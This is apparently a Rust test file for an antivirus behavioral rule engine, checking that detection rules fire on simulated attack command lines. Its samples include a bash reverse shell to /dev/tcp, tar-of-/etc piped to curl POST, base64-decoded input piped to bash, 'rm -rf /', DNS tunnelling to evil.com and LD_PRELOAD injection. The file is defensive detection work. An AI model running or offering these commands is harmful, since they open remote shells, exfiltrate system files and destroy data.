// Detection regression tests for WinnCoreAV.
//
// This file is included by `av-behavioral` integration tests so the assertions
// run under `cargo test -p av-behavioral`.

use av_behavioral::rules::{Rule, RuleEngine};
use av_ebpf_common::{ProcessExecEvent, MAX_ARGS_LEN, MAX_COMM_LEN, MAX_PATH_LEN};

fn build_engine() -> RuleEngine {
    let rules_json = include_str!(concat!(
        env!("CARGO_MANIFEST_DIR"),
        "/rules/linux_behavioral.json"
    ));
    let parsed: serde_json::Value =
        serde_json::from_str(rules_json).expect("linux_behavioral.json must be valid JSON");
    let rules_arr = parsed
        .get("rules")
        .and_then(|v| v.as_array())
        .expect("linux_behavioral.json must contain top-level {\"rules\": [...]}");

    let rules: Vec<Rule> = rules_arr
        .iter()
        .map(|v| serde_json::from_value::<Rule>(v.clone()).expect("rule entry must parse"))
        .collect();

    let mut engine = RuleEngine::new();
    engine.load_rules(rules);
    engine
}

fn exec_event(cmdline: &str) -> ProcessExecEvent {
    let mut event = ProcessExecEvent {
        pid: 1234,
        ppid: 1,
        uid: 1000,
        gid: 1000,
        timestamp_ns: 0,
        comm: [0u8; MAX_COMM_LEN],
        filename: [0u8; MAX_PATH_LEN],
        args: [0u8; MAX_ARGS_LEN],
        args_len: 0,
    };

    let comm = b"bash";
    event.comm[..comm.len()].copy_from_slice(comm);

    let exe = b"/usr/bin/bash";
    event.filename[..exe.len().min(MAX_PATH_LEN - 1)].copy_from_slice(&exe[..exe.len().min(MAX_PATH_LEN - 1)]);

    let bytes = cmdline.as_bytes();
    let len = bytes.len().min(MAX_ARGS_LEN - 1);
    event.args[..len].copy_from_slice(&bytes[..len]);
    event.args_len = len as u32;
    event
}

fn assert_rule_matches(rule_id: &str, cmdline: &str) {
    let engine = build_engine();
    let event = exec_event(cmdline);
    let matches = engine.evaluate_process(&event);
    let matched_ids: Vec<String> = matches.iter().map(|m| m.rule.id.clone()).collect();
    assert!(
        matched_ids.iter().any(|id| id == rule_id),
        "Expected rule {rule_id} to match, but got: {matched_ids:?}\ncmdline: {cmdline}"
    );
}

#[test]
fn matches_attack_sim_obfuscation_hex_double_quotes() {
    assert_rule_matches(
        "obf_hex_encoding",
        r#"bash -c 'echo -e "\x69\x64" 2>/dev/null || true'"#,
    );
}

#[test]
fn matches_attack_sim_obfuscation_rot13_double_quotes() {
    assert_rule_matches(
        "obf_rot13",
        r#"bash -c 'echo "vq" | tr "a-zA-Z" "n-za-mN-ZA-M"'"#,
    );
}

#[test]
fn matches_attack_sim_container_docker_socket_ls() {
    assert_rule_matches("privesc_container_escape", "ls -la /var/run/docker.sock");
}

#[test]
fn matches_attack_sim_dns_tunnel_dig_short_txt_ordering() {
    assert_rule_matches(
        "heur_dns_tunnel",
        r#"bash -c 'echo "dig +short TXT data.evil.com"'"#,
    );
}

#[test]
fn matches_attack_sim_impact_rm_rf_root() {
    assert_rule_matches("impact_destroy", "echo 'rm -rf /' > /tmp/wc-destruct.txt");
}

#[test]
fn matches_attack_sim_iouring_inspection() {
    assert_rule_matches(
        "evasion_io_uring",
        "ls /proc/*/fd 2>/dev/null | xargs ls -la 2>/dev/null | grep -c io_uring",
    );
}

#[test]
fn matches_attack_sim_env_slicing() {
    assert_rule_matches(
        "obf_env_slice",
        r#"bash -c 'echo ${PATH:0:1}etc${PATH:0:1}passwd'"#,
    );
}

#[test]
fn matches_attack_sim_base64_decode_exec() {
    assert_rule_matches(
        "exec_base64_decode",
        "echo 'aWQ=' | base64 -d | bash 2>/dev/null || true",
    );
}

#[test]
fn matches_attack_sim_reverse_shell_pattern() {
    assert_rule_matches(
        "exec_reverse_shell",
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    );
}

#[test]
fn matches_attack_sim_python_suspicious_import() {
    assert_rule_matches(
        "exec_python_net",
        "python3 -c 'import socket,subprocess,os; print(1)'",
    );
}

#[test]
fn matches_attack_sim_process_injection_ld_preload() {
    assert_rule_matches("heur_proc_injection", "echo \"LD_PRELOAD=/tmp/lib.so test\"");
}

#[test]
fn matches_attack_sim_data_exfiltration_tar_to_curl() {
    assert_rule_matches("heur_data_exfil", "tar czf - /etc | curl -X POST -d @- http://x");
}
